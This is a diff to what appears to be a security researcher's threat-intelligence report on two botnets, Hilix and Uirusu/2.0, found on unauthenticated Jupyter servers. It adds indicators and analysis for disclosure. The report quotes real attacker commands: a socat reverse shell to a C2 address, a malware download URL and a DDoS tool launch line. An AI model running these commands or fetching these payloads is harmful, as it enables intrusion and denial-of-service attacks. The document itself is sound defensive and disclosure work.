@@ -104,7 +104,7 @@ Load average at probe: `5.19, 5.17, 5.11` on a likely-4-core ARM Xilinx Zynq Ult
 | 2026-03-24 | `_recon.py` + `_recon.ipynb` | recon | whoami / uname / nvidia-smi / /etc/passwd |
 | 2026-03-31 | `2.js` (38KB) | L7 DDoS tool | Node.js HTTP/2 HPACK flood, multi-process cluster, proxy-rotation |
 | 2026-03-31 | `proxy.txt` | proxy list | (currently empty — was probably populated dynamically) |
-| 2026-04-05 | `vcimanagement.x64` (784KB) | unknown ELF64 attacker binary | SHA256 `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0` |
+| 2026-04-05 | `vcimanagement.x64` (784KB) | **Uirusu/2.0 botnet (separate Hilix-class actor)** | SHA256 `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0`. Distinct from Hilix-classic — different C2 (`173.232.146.173` / `zknotes.com` / Eonix US), different UA (literal `Uirusu/2.0` vs browser-rotation), different payload paths (`/bins/x86` + `/8UsA.sh` vs `Hilix.<arch>`), different exploit set (adds ThinkPHP CVE-2018-20062 + MVPower DVR). Disclosed 2026-05-07 to `net-abuse@eonix.net` |
 | 2026-04-28 | **`x86_64`** (112KB) | **CONFIRMED Hilix botnet propagation module** | SHA256 `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
 | 2026-04-29 | `Untitled.ipynb` (4 cells) | attacker working notebook | |
 | 2026-04-27 | `Untitled1.ipynb` (28 cells) | **DDoS launch + /etc/shadow modification** | Cell #1: `node 2.js GET https://a.intincity.promo 10000 10 32 proxy.txt`; cell #20: Python /etc/shadow modify-root-password attempt |
@@ -148,11 +148,17 @@ The Hilix payload arguments (`huawei` / `realtek` / `jupiter` etc.) are **botnet
 
 | Type | Value |
 |---|---|
-| C2 IP | `172.233.96.208` |
-| Malware-distro IP | `38.87.117.84` |
-| Malware-distro hostname | `velonodes.in` |
-| Hilix x86_64 SHA256 | `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
-| Unknown ELF64 SHA256 | `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0` (`vcimanagement.x64`) |
+| Hilix-classic C2 | `172.233.96.208:3053` (Akamai/Linode US) |
+| Hilix-classic malware-distro | `38.87.117.84` (`velonodes.in`, Cogent / DATALIX) |
+| Hilix-classic SHA256 (`x86_64`) | `ee51b236e57d96521da5fb820242c23996dcc691d3df8830655801b2a516bb72` |
+| Hilix-classic UA pool | rotation across Chrome 120, Firefox 121, Safari 17, mobile UAs (uses `User-Agent: %s` printf format) |
+| Hilix-classic campaign tags | `huawei`, `realtek`, `jupiter` |
+| **Uirusu/2.0 C2** | `173.232.146.173` (`zknotes.com`, Eonix US) |
+| **Uirusu/2.0 SHA256** (`vcimanagement.x64`) | `38dce395aa82fea8b4ea00de17e14f3b7db9a5ebb28e82529ed66aa2b0f44eb0` |
+| **Uirusu/2.0 UA signature** | literal `Uirusu/2.0` (Japanese ウイルス = virus) + `python-requests/2.20.0` |
+| **Uirusu/2.0 payload paths** | `/bins/x86`, `/mips`, `/8UsA.sh` (drops shell installer) |
+| **Uirusu/2.0 campaign tags** | `mips`, `ThinkPHP` |
+| **Uirusu/2.0 exploit bundle** | UPnP/HG532 (CVE-2017-17215) + ThinkPHP (CVE-2018-20062) + MVPower DVR RCE + Huawei admin Digest hardcoded |
 | Hilix.mips download URL | `http://38.87.117.84/bins/Hilix.mips` |
 | Reverse-shell port | `tcp/3053` |
 | Reverse-shell command pattern | `socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053` |
@@ -177,6 +183,8 @@ The Tencent host completed steps 1–7; the Ulm host stuck at step 5 (architectu
 **#13 — Unauthenticated Jupyter Notebook on a public port = automatic Linux foothold within days.** Jupyter's kernel-execute endpoint is untokenized shell access by design. Of the 2 externally-reachable unauth Jupyters in this 7-host Shodan dork sample, **both were already compromised** — 100% compromise rate. This is a higher empirical infection rate than any platform in the prior synthesis (vector DBs, MLflow, Triton, Langfuse, etc.) — Jupyter is qualitatively the worst exposure class.
 
 **#14 — Cross-victim infrastructure-sharing reveals botnet operator identity.** When the same SHA256 binary, same C2 IP, same malware-distro server appear across multiple victims in the same week, it's strong evidence of a single operator (or a single payload kit being shared among operators). The Ulm + Tencent finding crystallized within hours of the campaign-coincidence-discovery — both `Hilix.x86_64` from `38.87.117.84`, both 2026-04-28/29.
+
+**#14a — Multi-actor convergence on the same unauth surface (added 2026-05-07).** Static analysis of the second binary on the Tencent victim (`vcimanagement.x64`) revealed a *different* Mirai-derivative — Uirusu/2.0 — with distinct C2 (`173.232.146.173` / Eonix vs Hilix-classic's `172.233.96.208` / Linode), distinct User-Agent pattern (literal `Uirusu/2.0` vs Hilix-classic's browser-rotation), and broader exploit bundle (adds ThinkPHP CVE-2018-20062 + MVPower DVR to the standard UPnP/HG532). The Tencent host had been compromised by Uirusu/2.0 on 2026-04-05 and then by Hilix-classic on 2026-04-28 — **two separate botnet operators converged on the same unauthenticated-Jupyter attack surface within 23 days**. This is direct empirical support for the vendor-template thesis (Methodology Insight #10): when a default-no-auth web management interface is exposed at population scale, multiple uncoordinated botnet operators discover and exploit it independently. The compromise rate observed in this 2-host sample (100% of externally-reachable hosts; 2 distinct actors on one of them) suggests the unauth-Jupyter attack surface is in steady-state competitive exploitation by multiple botnet families. Captured in the Eonix C2 takedown disclosure ([`disclosures/EONIX-173-232-146-173-uirusu-c2.md`](../../disclosures/EONIX-173-232-146-173-uirusu-c2.md)).
 
 **#15 — Active forensic preservation on compromised hosts is justified before C2 takedown.** Sending `abuse@akamai.com` for the C2 takedown KILLS the attacker's infrastructure but also kills the operational visibility into who the attacker was, what they did, what they exfiled. Pulling forensic state via the same Jupyter API the attacker used (read-only, no kernel-exec needed for file pulls) preserves the evidence before takedown.
 
